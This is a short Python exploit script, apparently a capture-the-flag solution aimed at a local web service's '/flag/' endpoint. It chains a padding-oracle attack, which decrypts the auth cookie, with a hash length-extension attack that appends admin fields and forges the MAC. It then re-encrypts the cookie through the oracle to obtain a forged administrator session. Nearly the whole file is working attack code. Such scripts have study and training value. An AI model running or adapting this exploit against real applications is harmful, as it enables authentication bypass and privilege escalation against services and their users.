#!/usr/bin/env python

import sys

from pwn import *
from base64 import urlsafe_b64decode, urlsafe_b64encode
from oracle import PaddingOracle
from hashpumpy import hashpump

import requests

base_url = sys.argv[1]
base_url = 'http://127.0.0.1:8080'

cookie = ''
try:
    cookie = read('cookie.tmp')
except IOError:
    resp = requests.post(base_url + '/login/', data = {'username':'lol','password':'lol'}, allow_redirects=False)
    cookie = urlsafe_b64decode(resp.cookies['auth'])
    write('cookie.tmp', cookie)

def query(val):
    for _ in range(3):
        try:
            resp = requests.get(base_url + '/flag/', cookies = { 'auth' : urlsafe_b64encode(val) })
            return True
        except requests.exceptions.ConnectionError:
            pass
    return False

cookie_decrypted = ''

oracle = PaddingOracle(query = query, block_size = 8, nested = 3)

print "Decrypting cookie..."

try:
    cookie_decrypted = read('cookie_decrypted.tmp')
except IOError:
    cookie_decrypted = oracle.decrypt(cookie)
    write('cookie_decrypted.tmp', cookie_decrypted)

print "Decrypted Cookie:"

print hexdump(cookie_decrypted)

mac, pt = cookie_decrypted[:16], cookie_decrypted[16:]
key_size = 16

print "Extending cookie..."

new_mac, new_data = hashpump(enhex(mac), pt, "&username=almighty_administrator&is_admin=of_course", key_size)

print "New MAC:", new_mac

new_cookie = unhex(new_mac) + new_data

print "New Cookie:"

print hexdump(new_cookie)

print "Encrypting cookie..."

extended_cookie = ''

try:
    extended_cookie = read('extended_cookie.tmp')
except IOError:
    iv, ct = oracle.encrypt(new_cookie)
    extended_cookie = iv + ct
    write('extended_cookie.tmp', extended_cookie)

print 'Cookie:', urlsafe_b64encode(extended_cookie)
